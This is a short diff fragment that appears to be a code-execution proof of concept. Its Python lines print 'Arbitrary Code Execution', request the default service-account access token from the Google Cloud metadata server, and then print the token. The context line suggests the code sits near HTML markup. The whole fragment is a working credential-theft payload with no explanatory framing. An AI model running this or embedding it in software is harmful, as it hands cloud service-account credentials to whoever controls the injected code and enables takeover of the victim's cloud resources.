@@ -262,3 +262,4 @@ outline: 0;" aria-hidden="true"></div>
 print('Arbitrary Code Execution')
 import requests
 r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers={"Metadata-Flavor":"Google"})
+print('User token: ' + r.content)
